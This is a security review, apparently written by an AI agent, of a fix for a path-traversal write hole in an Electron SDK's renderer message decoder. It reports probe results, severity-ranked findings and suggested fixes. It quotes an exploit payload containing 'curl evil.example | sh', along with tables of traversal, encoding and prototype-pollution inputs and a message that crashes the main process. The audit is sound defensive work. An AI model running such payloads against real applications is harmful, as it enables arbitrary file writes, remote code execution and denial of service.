# Adversarial review — Wave 0.2 fix (`c3fff47`), `@bugsee/electron` renderer wire input

Scope: commit `c3fff47` ("validate untrusted renderer wire input"), the claimed fix for
`docs/review/electron.md` SEV1 #1. Read-only review; every probe below was run against the
**current, unmodified** sources, every mutation was applied from a `cp` backup and restored, and
`git status --short` is empty at the end.

---

## Verdict

**The original hole is genuinely closed.** The documented exploit and 30 further traversal
encodings all fail to escape the capture root; the pre-fix decoder fails 5 of the new tests, so the
suite does catch a regression of the exact original defect. The commit's headline claim holds, and
its numbers (electron 122/122, core+electron 835/835, typecheck clean) reproduce exactly.

**But the fix is incomplete at the very call site it hardened.** `decodeStreamEntry` validates 5 of
the message's 7 fields. The two it left alone — `p` and `red` — are also attacker-controlled, and
`p` is the more dangerous of the pair: an **absent `p` still passes validation** and makes the
decoder return `payload: undefined` while its declared type is `string`. That non-string reaches
`store.add`, and on the memory-backed store it throws a `TypeError` straight out of the `ipcMain`
listener. This is precisely the "typed but untrusted" defect class the commit set out to close,
left open on the same object, five lines below the new guard.

Separately, the commit validated `ts` — but `ts` is **not** the timestamp the report bundle uses.
The bundle reads the timestamp from *inside* the still-unvalidated `p`.

1 × SEV1, 3 × SEV2, 4 × SEV3.

---

## Is the hole closed?

### Reproduction attempts and results

Harness: the real `createElectronMainReceiver` (`packages/electron/src/main-receiver.ts:37`) wired
to a real `createFileCaptureStore(createFsChunkStorage(root))`, with a scratch `victim/` sibling
directory. All probes targeted the session scratchpad only.

| Probe | Payload class | Result |
|---|---|---|
| 1 | The exact documented exploit `{"k":"entry","t":"../../../victim/pwned.txt","ts":"#!/bin/sh\ncurl evil.example \| sh\n#","p":{"evil":"payload"}}` | **BLOCKED** |
| 2 | `..`, `../`, `../../../victim/x`, 10-deep `../`, `..\..\..\` (Windows sep) | **BLOCKED** |
| 3 | URL-encoded `..%2f..%2f`, `%2e%2e/%2e%2e/`, double-encoded `%252e%252e%252f` | **BLOCKED** |
| 4 | Unicode: `\u002e\u002e/`, fullwidth `\uFF0E\uFF0E/`, division-slash `..\u2215..\u2215` | **BLOCKED** |
| 5 | Absolute: `/etc/x`, `/private/tmp/absolute-probe.txt`, `C:\windows\x`, `\\server\share\x`, a fully-qualified scratch path | **BLOCKED** |
| 6 | NUL truncation `log\u0000/../../../victim/nul.txt` | **BLOCKED** |
| 7 | Mixed `log/../../../../victim/x`, `./../../victim/x`, `....//....//victim/x`, `victim/../../victim/x` | **BLOCKED** |
| 8 | 5000-char type, `.`, `~/.zshrc`, `deep/a/b/nested.txt` | **BLOCKED** |
| 9 | In-allowlist but store-special: `t: 'meta'` (the chunk backend's own index file, `packages/core/src/file-chunk-backend.ts:16`) | **BLOCKED** — `meta` is not a `FileType`, so it is not in the allowlist. No `FileType` collides with `META_FILE`; verified against the full union at `packages/protocol/src/constants.ts:16-32` |
| 10 | Non-string `t`: `1`, `true`, `null`, `["log"]`, `{"toString":"log"}` | **BLOCKED** |
| 11 | Prototype pollution: `t` of `__proto__` / `constructor` / `prototype` / `hasOwnProperty` / `toString`; `{"k":"entry","t":"log","__proto__":{…}}`; `{"__proto__":{"k":"entry","t":"../../../victim/x"}}`; pollution nested in `p` | **BLOCKED**, and `Object.prototype` was left unpolluted. `KNOWN_FILE_TYPES` is a real `Set` (`protocol.ts:66-73`), so `Set.prototype.has` is immune to inherited keys — the right primitive |
| 12 | Getter / `toJSON`-carrying `t` | Unreachable by construction: the only entry point is `decodeStreamEntry(raw: string)` → `JSON.parse`, which yields plain data. A getter cannot cross this wire |

**Net: 32 payloads, 0 files created outside the capture root**, and the listener never threw. The
only files produced inside the root were `log` (from the legitimate control payload) and the chunk
store's own `meta`.

### Frame framing via `p` — cannot be desynchronised

The original finding notes the on-disk frame is `` `${timestamp}\t${serialized}\n` ``
(`packages/core/src/file-chunk-backend.ts:88`). I emitted entries whose `p` contained a literal
newline, a literal tab, `U+2028`/`U+2029`, and a `p` that was itself the string
`"9999\tinjected\n5555"`.

`protocol.ts:115` re-serialises with `JSON.stringify(message.p)`, which escapes `\n` → `\\n` and
`\t` → `\\t`, so no separator survives into the frame. `U+2028`/`U+2029` are written literally but
are not the `\n` the reader splits on. Result: **5 emits → 5 physical lines → 5 frozen records.**
Framing holds.

### Does the suite catch a regression of the original exploit?

Yes, and specifically. Restoring the **entire pre-fix decoder** (`git show c3fff47^`) over the
current sources fails **5 of the 21** `protocol.test.ts` tests, including
`rejects a path-traversal file type (the proven arbitrary-write exploit)`. The commit's "5 of 7 new
tests were red beforehand" claim is exact.

---

## SEV1

### 1. `p` is the one field the fix did not validate, and an absent `p` breaks the decoder's own type contract — reaching `store.add` and, on the memory store, throwing out of the `ipcMain` listener

- **Where:** `packages/electron/src/protocol.ts:115` (`payload: JSON.stringify(message.p)`) ·
  `protocol.ts:20` (`payload: string` — the declared type) · `protocol.ts:46` (`p?: unknown` — never
  checked) · `packages/electron/src/main-receiver.ts:50` (`serialized: decoded.payload`) ·
  `packages/core/src/memory-chunk-backend.ts:40` · `packages/util/src/utf8-byte-length.ts:11`
- **What:** the new guard at `protocol.ts:89` covers `k` and `t`; `protocol.ts:95-106` covers `s`,
  `ts`, `mono`, `o`. `p` is passed to `JSON.stringify` with no check. `JSON.stringify(undefined)`
  returns **`undefined`, not a string**, so a message that simply omits `p` produces a
  `DecodedStreamEntry` whose `payload` is `undefined` while `DecodedStreamEntry.payload` is declared
  `string` (`protocol.ts:20`). `main-receiver.ts:50` hands that straight to
  `store.add({ serialized: undefined })`.
- **Failure scenario (both verified empirically):**
  - **`capturedDataStore: 'memory'`** (a supported, documented launch option —
    `packages/node/src/launch.ts:199` and `:237`): `memory-chunk-backend.ts:40` calls
    `utf8ByteLength(record.serialized)` on the raw `undefined` →
    `TypeError: Cannot read properties of undefined (reading 'length')` at
    `utf8-byte-length.ts:11`, with the stack
    `utf8ByteLength ← memory-chunk-backend.ts:40 ← chunk-capture-store.ts:76 ← listener (main-receiver.ts:50)`.
    There is no try/catch in `main-receiver.ts:41-56`, so the throw escapes the `ipcMain` listener
    (compounding `electron.md` SEV2 #6). Any XSS'd renderer can fire
    `__bugseeElectron.post('{"k":"entry","t":"log","ts":4}')` — 30 bytes — in a loop and drive an
    uncaught exception in the Electron **main** process, i.e. terminate the app.
  - **Default `capturedDataStore: 'disk'`** (`packages/node/src/data-location.ts:115`): no throw —
    `file-chunk-backend.ts:88` interpolates into a template string first, so the literal text
    `4\tundefined\n` is **persisted** to the capture file. At export the record is unrecoverable:
    `capture-data-entry.ts:21` runs `JSON.parse("undefined")` → `SyntaxError: "undefined" is not
    valid JSON`, caught and skipped at `capture-exporter.ts:37-43`. Measured: 2 entries emitted, **1
    exported**, one export error.
- **Why this is SEV1 rather than a leftover:** it is the same message, the same call site, the same
  "typed field, untrusted value" pattern, and the same `store.add` sink that the commit was written
  to harden. A legitimate sender cannot produce it — `encodeStreamEntry` (`protocol.ts:24-36`)
  splices `,"p":${entry.payload}}`, so an absent payload yields invalid JSON that the decoder
  rejects. This shape exists only for a hostile sender.
- **Fix shape (not applied):** require `p` to be present (`message.p !== undefined`) — or assert the
  `JSON.stringify` result is a `string` — and drop the message otherwise, consistent with the
  drop-don't-sanitise policy the commit already states at `protocol.ts:61-63`.

---

## SEV2

### 2. The commit validated `ts`, but `ts` is not the timestamp the bundle uses — `p.timestamp` is unvalidated and poisons `manifest.time.start`

- **Where:** `packages/core/src/capture-data-entry.ts:20-24` ·
  `packages/core/src/bundle-assembler.ts:145-147` · `packages/electron/src/protocol.ts:96` (the
  field that *was* validated)
- **What:** the renderer's streaming store puts `CaptureDataEntryBase.serialize()` —
  `{"timestamp":…,"data":…}` — into `p` (`packages/core/src/streaming-capture-store.ts:80-88`).
  At report time `CaptureDataEntryBase.deserialize` reads `this.timestamp = parsed.timestamp`
  **from inside the payload**, not from the wire `ts`. `bundle-assembler.ts:145-147` then does
  `if (entry.timestamp < start) start = entry.timestamp` to compute `manifest.time.start`.
  `p.timestamp` passes through `JSON.stringify`/`JSON.parse` completely unchecked.
- **Failure scenario (verified):** a renderer posts
  `{"k":"entry","t":"log","ts":1700000000000,"p":{"timestamp":-1e308,"data":{}}}`. `ts` satisfies
  the new `Number.isFinite` gate; the reified entry's timestamp is `-1e+308`; the computed
  `manifest.time.start` becomes **`-1e+308`** for the whole report. A second probe with
  `p.timestamp: "not-a-number"` yields a *string* in a field typed `number`.
- **Note:** validating `ts` was still correct (it is `StoredEntry.timestamp` and the frame prefix) —
  it is just not the field that reaches the manifest. The commit message's rationale ("`ts` … is
  written verbatim into the on-disk frame") is accurate but describes only half the exposure.

### 3. Defence in depth: every `ChunkStorage` implementation still `path.join`s an unvalidated segment — the SDK is one slip from the same outcome, on Node as well as Electron

- **Where:** `packages/node-utils/src/fs-chunk-storage.ts:33-34` ·
  `packages/node-utils/src/batched-fs-chunk-storage.ts:112-113` (**the default on Electron main and
  `@bugsee/node`**) · `packages/node-utils/src/capture-ring-writer.ts:151` and `:155-166`
  (`mainAppend`) · `packages/core/src/file-chunk-backend.ts:89`
- **Evidence (verified):** a direct `store.add({ type: '../../../victim/depth-pwned.txt', … })` on a
  real `createFileCaptureStore` **still writes outside the capture root today**, producing
  `1\t{"x":1}\n` in the victim directory. The only thing standing between the SDK and the original
  finding is the decoder's allowlist.
- **Why it matters beyond Electron:** the same store backs `@bugsee/node`. Any present or future
  caller of `store.add` with an influenced `type` inherits the full primitive. There are three such
  callers today (`packages/core/src/capture-aggregator.ts:64`,
  `packages/performance/src/controller.ts:105`, `packages/performance/src/extension.ts:81`) — all
  currently fed by trusted internal code, but by convention only.
- **A near-miss worth calling out:** `capture-ring-writer.ts:178` already resolves the file name
  through a closed `fileTypes` array (`packages/node/src/launch.ts:111` —
  `[...Object.keys(DEFAULT_FILENAMES), 'attachment']`, i.e. exactly the right set). But it is a
  *routing* decision, not a guard: `:179-181` sends an unknown type to `mainAppend`, which
  `path.join`s it unvalidated. The correct set is already computed and already threaded to the
  storage layer — it just is not enforced there.
- **Belt-and-braces fix shape:** have `ChunkStorage.append/write/read` reject any `file` segment not
  in `CAPTURE_FILE_TYPES` (or, structurally, resolve `file` to a name via a closed map rather than
  accepting a caller-supplied string). Cheapest correct variant: a shared
  `assertKnownFileType(file)` in `@bugsee/core` called from `file-chunk-backend.ts:89`, which covers
  all three storage media at one choke point.

### 4. Capture suppression: any renderer can evict the main process's genuine capture by flooding

- **Where:** `packages/core/src/chunk-capture-store.ts:60-69` (`enforceByteCap`) ·
  `packages/node/src/launch.ts:473-476` (the cap is **on by default**) ·
  `packages/electron/src/main-receiver.ts:41-56` (no rate limit, no per-sender accounting)
- **Evidence (verified):** with a byte cap set, a main-process `crash` entry was written first, then
  a renderer streamed 20 padded `log` entries. The genuine crash record was **evicted** — probe
  reported `GENUINE_CRASH_SURVIVED= false`.
- **Assessment:** this is not introduced by `c3fff47`, and it is partly inherent to a bounded ring
  shared by mutually-untrusting processes. But it is now the strongest remaining renderer→main
  primitive: an attacker who has XSS in a renderer can destroy the evidence window of the incident
  they caused, and the receiver has no notion of which sender contributed which bytes. Ranked SEV2
  rather than SEV1 because it needs no defect to exploit (a merely noisy renderer does the same) and
  it degrades only the SDK's own buffer — no code execution, no data egress.

---

## SEV3

### 5. `red` is the other unvalidated field — a typed-`boolean` lie on an exported API

- **Where:** `packages/electron/src/protocol.ts:113` (`redacted: message.red ?? false`) ·
  `protocol.ts:19` (declared `redacted: boolean`) · exported from
  `packages/electron/src/index.ts:9-14`
- **Verified:** `{"red":"not-a-bool"}` yields `redacted: "not-a-bool"` (`typeof` `string`);
  `{"red":{"a":1}}` yields the object.
- **Currently inert** because `main-receiver.ts:50-54` drops `redacted` and never forwards it (which
  is `electron.md` SEV2 #8, the dead provenance flag). It becomes live the moment that finding is
  fixed. Given the commit's own stated policy — validate every attacker-controlled field, drop on
  failure — leaving `red` out is an inconsistency, not a judgement call.

### 6. The allowlist is not pinned to the `FileType` set — a surviving mutation with real consequences

- **Where:** `packages/electron/src/protocol.ts:66-69` · tests at
  `packages/electron/src/protocol.test.ts:146-162`
- **Verified surviving mutation (M6b):** widening `KNOWN_FILE_TYPES` with `'meta'`, `'owner.json'`
  and `'.live'` leaves **21/21 tests passing**. Those are not arbitrary strings: `meta` is the chunk
  backend's own per-part index file (`packages/core/src/file-chunk-backend.ts:16`), and
  `owner.json` / `.live` are the multi-instance coexistence control files
  (`docs/design/multi-instance-disk-coexistence.md`). Any of them entering the allowlist would let a
  renderer append garbage to the store's own metadata **inside** the capture root — no traversal
  required — and no test would notice.
- The `accepts every legitimate FileType` test (`:158-162`) pins one direction only. The repo
  already has the two-directional pattern: `packages/protocol/src/upload-contract.test.ts:26-29`
  asserts set equality between the code's `FileType` list and the schema. Applying the same shape
  here (`expect([...KNOWN_FILE_TYPES].sort()).toEqual(expectedFileTypes.sort())`) closes it.

### 7. The tests do not pin the prototype-safe lookup — a `Set` → plain-object swap survives

- **Where:** `packages/electron/src/protocol.ts:66-73` · tests at `protocol.test.ts:146-156`
- **Verified surviving mutation (M7):** replacing the `Set` with an `Object.fromEntries` map and
  `KNOWN_FILE_TYPES_OBJ[value] !== undefined` leaves **21/21 tests passing**, even though under that
  implementation `t: 'constructor'`, `t: 'toString'` and `t: '__proto__'` are all *accepted*
  (inherited from `Object.prototype`). The rejected-type list at `:147` contains no
  `Object.prototype` key. The current implementation is correct; the tests simply do not defend the
  property that makes it correct.

### 8. Test theater in two of the seven new tests, and the commit message misdescribes its own remediation

- **Where:** `packages/electron/src/protocol.test.ts:153` and `:167-176`
- `:153` — `{ toString: () => 'log' }` in the list of non-string types. `JSON.stringify` drops
  functions, so what actually reaches the decoder is `{}`. The test passes, but not for the reason
  its name gives.
- `:172-173` — `Number.NaN` and `Number.POSITIVE_INFINITY` are **still present**. The commit message
  states they were "Replaced with the forms JSON can actually deliver (string/object/array/bool/
  null)". They were not replaced, and `null` was never added explicitly — both serialise to `null`,
  so those two cases pass by rejecting a value neither of them names. This is the same pattern the
  first review flagged as findings #15 and #20; the disclosure was honest about the M4 *analysis*
  but the code was not updated to match.
- **M4 independently confirmed as a genuine equivalent mutant:** replacing `Number.isFinite(value)`
  with `true` (`protocol.ts:78`) leaves 21/21 passing, and the author's reasoning is correct —
  `JSON.parse` cannot produce `NaN`/`Infinity`, and `decodeStreamEntry` takes only a string. Keeping
  the `isFinite` guard as defence for non-JSON callers is the right call.
- **No integration-level test.** All seven new tests exercise the decoder in isolation. The defect
  being fixed was an *integration* defect (decoder → `main-receiver` → `store.add` → `path.join`),
  and `docs/implementation-standards.md` §3 requires integration tests at cross-module boundaries. A
  test that drives `createElectronMainReceiver` against a real file-backed store and asserts nothing
  is created outside the root would survive refactors that move or bypass the decoder; the current
  tests would not.

---

## Sibling paths audited

Hunted specifically for "fixed at one call site, sibling left open".

| Path | Renderer-influenced? | Status |
|---|---|---|
| `packages/electron/src/main-receiver.ts:50` — `store.add` | **Yes** | The audited path. `type` now validated; `p`/`red` are not (SEV1 #1, SEV3 #5) |
| `packages/core/src/capture-aggregator.ts:64` — `store.add` | No | `type` comes from internal providers via `CaptureProviderBase.capture(type, …)` (`capture-provider-base.ts:65`), always a literal |
| `packages/performance/src/controller.ts:105`, `extension.ts:81` — `store.add` | No | APM-internal transaction objects |
| Report / crash forwarding | No | `report.crash` is built main-side from a thrown `Error`; `bundle-assembler.ts:163-167` uses the fixed name from `fileNameForType('crash')` |
| `reportSnapshots` | No | Registered at launch (`launch-main.ts:66-70`) from the pixel-video controller; renderers cannot register a source |
| `fileEncoders` | No | Keyed by `FileType` from `launch-main.ts:71` / `browser/src/launch.ts:387`; renderer values never index it |
| Attachment names → `bundle-assembler.ts:173` (`filename: attachment.name`) | No | `report.attachments` is main-side only (the harvested Crashpad `.dmp`, named from a `readdir` of the crash-dumps directory). Worth noting these names become **zip entry names** — a zip-slip concern for whoever unpacks the bundle, but no renderer reaches them and the SDK does not write them to its own filesystem |
| `decodeControl` (`protocol.ts:156-171`) | **No** | Control flows main→renderer only. `ipcMain` listens on the stream channel (`main-receiver.ts:59`) and the hello channel (`main-control.ts:87`) — **not** the control channel — so a renderer cannot inject pause/stop/flush/session at another renderer. Uses a `Set` for `CONTROL_COMMANDS` (`protocol.ts:123-129`), so it is prototype-safe. `sid` (`:168-170`) is unvalidated but is only ever produced by the trusted main process |
| `isHello` (`protocol.ts:179-185`) | **Yes**, but harmless | `main-control.ts:73-83` registers the sender and replies with the session id. A renderer cannot spoof another renderer's session (`renderers` is keyed by the real `webContents` identity from `event.sender`), cannot suppress another renderer's capture, and cannot issue control commands. The only leak is that any renderer learns the owner session id — already recorded as `electron.md` SEV3 #19. Flooding `hello` is bounded: the `Set` dedupes by sender |

**Conclusion: `main-receiver.ts:50` is the only renderer-influenced `store.add` in the repo.** The
fix is in the right place. It is just not complete on that message.

---

## Defence-in-depth assessment

**The SDK is exactly one validation slip from the original outcome, and that is empirically
demonstrated, not theoretical** (SEV2 #3: a direct `store.add` with a hostile `type` still writes
outside the root today).

The layering is currently:

```
decodeStreamEntry (allowlist)  ← the ONLY guard, added by c3fff47
  → main-receiver.ts:50 store.add          (no guard)
  → chunk-capture-store.ts:76 add          (no guard)
  → file-chunk-backend.ts:89 append(type)  (no guard — passes `type` as the filename)
  → fs-chunk-storage.ts:33 / batched-fs-chunk-storage.ts:112 / capture-ring-writer.ts:151
      join(chunkDir, file)                 (no guard)
  → appendFileSecure                       (no guard)
```

Five layers, one check, at the top. That is the shape that produced the original SEV1.

Two things make this worse than a generic "add a second check" recommendation:

1. **The correct closed set is already computed and already threaded down to the storage layer.**
   `packages/node/src/launch.ts:111` defines `CAPTURE_FILE_TYPES` as
   `[...Object.keys(DEFAULT_FILENAMES), 'attachment']` — byte-for-byte the same set the new decoder
   guard uses — and passes it into `createCaptureRingWriter` (`launch.ts:495`). The ring writer uses
   it at `capture-ring-writer.ts:178` to pick a ring slot, then **falls back to an unvalidated
   `path.join`** for anything not in the set (`:179-181` → `mainAppend`, `:155-166`). The enforcement
   is one `if` away from code that already knows the answer.

2. **`file-chunk-backend.ts:120` reads the type back out of the filename** (`const type = file as
   FileType`) during `freeze`. So the filename is not an implementation detail of the storage
   medium — it *is* the type. That makes a closed-set constraint semantically correct rather than
   merely defensive: a file whose name is not a `FileType` can never be read back as a valid record
   anyway.

**Recommended belt-and-braces fix (single choke point):** validate in
`packages/core/src/file-chunk-backend.ts:89`, before `storage.append(...)`, that `record.type` is a
known `FileType`; drop + `onError` otherwise. One edit covers all three storage media
(`fs-chunk-storage`, `batched-fs-chunk-storage`, `capture-ring-writer`), both runtimes that use
them (`@bugsee/node` and Electron main), and every current and future `store.add` caller. Export the
predicate from `@bugsee/protocol` so `protocol.ts:66-73` and `launch.ts:111` stop maintaining three
copies of the same set — which would also close SEV3 #6 by construction.

---

## Checked and found clean

- **The documented exploit is dead.** 32 traversal/encoding variants, 0 escapes, no throw.
- **Prototype pollution is not reachable** through any field of the entry message, and
  `Object.prototype` was verified unpolluted after the probe. `Set.has` is the correct primitive and
  is used in both decoders (`protocol.ts:72`, `protocol.ts:127`).
- **No regression in legitimate traffic.** All 16 `FileType` values are accepted, and
  `encodeStreamEntry` → `decodeStreamEntry` is lossless across every field (`type`, `seq`,
  `timestamp`, `mono`, `timeOrigin`, `redacted`, `payload`) for all 16.
- **Finite-number edge cases still accepted correctly:** `0`, `-0`, `-1`, `0.1`, `1e21`, `1e300`,
  `Number.MAX_SAFE_INTEGER` all pass and none produce a tab or newline in the frame prefix.
- **Frame framing cannot be desynchronised** by `p` (see above).
- **The e2e still exercises real streaming.** `packages/electron/src/electron-e2e.test.ts:190` boots
  the real `launchMain` and two real renderers through the real preload, and `:231-232` asserts
  `{from:'renderer-1'}`, `{from:'renderer-2'}` and `{from:'main'}` all land in the **one** uploaded
  bundle — i.e. the new validation is genuinely on the live path and does not drop legitimate
  renderer entries.
- **`decodeControl` and `isHello` are not on an untrusted inbound path**, and a renderer cannot spoof
  another renderer's session or issue control commands (see the sibling table).
- **Commit claims that reproduce exactly:** electron 122/122; core 713 + electron 122 = **835/835**;
  `tsc --noEmit` clean; 5-of-7 tests red against the pre-fix decoder.
- **Mutations M1, M2, M3, M5 confirmed caught** (3, 2, 2 and 2 failing tests respectively), and M4
  independently confirmed as a genuine equivalent mutant for JSON input. Two reviewer-added
  mutations (M8: allowlist checks only the first path segment; M9: drop the `k === 'entry'` check)
  are also caught. Every mutation was verified to have *applied* (file diff non-empty) before its
  result was recorded, and the file was restored from a `cp` backup after each.

---

*All probes ran under
`/private/tmp/claude-501/-Users-alexeykarimov-Projects-Bugsee-javascript/c4cf2d48-d332-4f71-bb1b-c03e6e5793ea/scratchpad`.
No file outside that directory was written; no real home-directory file was touched. Scratch test
files were deleted and `git status --short` verified empty.*
